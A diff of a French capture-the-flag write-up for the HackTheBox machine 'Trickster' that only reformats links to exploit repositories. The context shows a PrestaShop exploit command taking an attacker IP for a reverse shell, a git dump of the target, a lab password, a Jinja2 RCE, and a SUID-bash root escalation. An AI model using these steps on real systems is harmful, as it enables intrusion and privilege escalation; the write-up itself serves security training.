@@ -140,7 +140,12 @@ POCs 🔍
   → https://github.com/0xDTC/Prestashop-CVE-2024-34716 (gh-nomi-sec)
   → https://github.com/aelmokhtar/CVE-2024-34716 (gh-nomi-sec)</code></pre>
 
-                    <p>Le PoC <a href="https://github.com/0xDTC/Prestashop-CVE-2024-34716" target="_blank" rel="noopener">Prestashop-CVE-2024-34716</a> demande :</p>
+                    <p>Le PoC suivant demande :</p>
+
+                    <p class="link-integration">
+                        <img src="https://www.google.com/s2/favicons?domain=github.com&sz=64" class="site-favicon" alt="">
+                        <a href="https://github.com/0xDTC/Prestashop-CVE-2024-34716" target="_blank" rel="noopener">GitHub - 0xDTC/Prestashop-CVE-2024-34716: PoC for CVE-...</a>
+                    </p>
 
                     <pre class="code code-wrap"><code class="language-Bash">./exploit.sh <target_url> <admin_endpoint> <admin_email> <attacker_ip></code></pre>
 
@@ -183,7 +188,12 @@ ________________________________________________
 
                     <p><code>http://shop.trickster.htb/.git/</code></p>
 
-                    <p>Je dump le git avec <a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noopener">git-dumper</a> :</p>
+                    <p>Je dump le git avec l'outil suivant :</p>
+
+                    <p class="link-integration">
+                        <img src="https://www.google.com/s2/favicons?domain=github.com&sz=64" class="site-favicon" alt="">
+                        <a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noopener">GitHub - arthaud/git-dumper: Dump a git repository fro...</a>
+                    </p>
 
                     <pre class="code code-wrap"><code class="language-Bash">git-dumper http://shop.trickster.htb/.git/ ./</code></pre>
 
@@ -211,7 +221,12 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 [*] Uploading XSS payload to trigger CSRF...
 [*] Keeping script running to monitor for incoming connections...</code></pre>
 
-                    <p>Finalement j'utilise un autre parce que celui-là ne fonctionne pas : <a href="https://github.com/aelmokhtar/CVE-2024-34716" target="_blank" rel="noopener">aelmokhtar/CVE-2024-34716</a>.</p>
+                    <p>Finalement j'utilise un autre parce que celui-là ne fonctionne pas :</p>
+
+                    <p class="link-integration">
+                        <img src="https://www.google.com/s2/favicons?domain=github.com&sz=64" class="site-favicon" alt="">
+                        <a href="https://github.com/aelmokhtar/CVE-2024-34716" target="_blank" rel="noopener">GitHub - aelmokhtar/CVE-2024-34716: CVE-2024-34716 : R...</a>
+                    </p>
 
                     <p>J'ai mon reverse shell. Maintenant je cherche des creds dans la db donc je me renseigne sur le stockage de secrets dans les apps PrestaShop. D'après <a href="https://devdocs.prestashop-project.org/8/development/configuration/configuring-prestashop/" target="_blank" rel="noopener">la documentation PrestaShop</a>, les fichiers de configuration importants sont :</p>
 
@@ -452,7 +467,12 @@ Nuclei Template ⚛️
 
                     <p>J'arrive sur une page de connexion dans laquelle je mets le mot de passe de james <code>alwaysandforever</code>. Je peux maintenant utiliser la CVE.</p>
 
-                    <p>Le PoC <a href="https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE" target="_blank" rel="noopener">CVE-2024-32651-changedetection-RCE</a> exploite la capacité d'introspection de Python via le moteur de template Jinja2 pour sandbox escape vers RCE :</p>
+                    <p>Le PoC suivant exploite la capacité d'introspection de Python via le moteur de template Jinja2 pour sandbox escape vers RCE :</p>
+
+                    <p class="link-integration">
+                        <img src="https://www.google.com/s2/favicons?domain=github.com&sz=64" class="site-favicon" alt="">
+                        <a href="https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE" target="_blank" rel="noopener">GitHub - s0ck3t-s3c/CVE-2024-32651-changedetection-RCE...</a>
+                    </p>
 
                     <ol>
                         <li><strong>Évasion du contexte (Sandbox Escape)</strong> :
@@ -595,7 +615,12 @@ Other options:
  --output ABCD, -o ABCD
                      The file where the output will be written...</code></pre>
 
-                    <p>D'après <a href="https://www.exploit-db.com/exploits/51983" target="_blank" rel="noopener">Exploit-DB</a>, c'est un logiciel d'impression 3D. On peut lancer un script de post-process après le découpage (slicing) d'un modèle. Comme je lance l'app en sudo, ce script sera exécuté en root !</p>
+                    <p class="link-integration">
+                        <img src="https://www.google.com/s2/favicons?domain=exploit-db.com&sz=64" class="site-favicon" alt="">
+                        <a href="https://www.exploit-db.com/exploits/51983" target="_blank" rel="noopener">Exploit-DB - PrusaSlicer Vulnerability</a>
+                    </p>
+                    
+                    <p>D'après Exploit-DB, c'est un logiciel d'impression 3D. On peut lancer un script de post-process après le découpage (slicing) d'un modèle. Comme je lance l'app en sudo, ce script sera exécuté en root !</p>
 
                     <ol>
                         <li>Je crée un script <code>pwn.sh</code> dans <code>/dev/shm</code> qui copie <code>/bin/bash</code> et lui met le bit <strong>SUID</strong> (<code>chmod 4777</code>)</li>
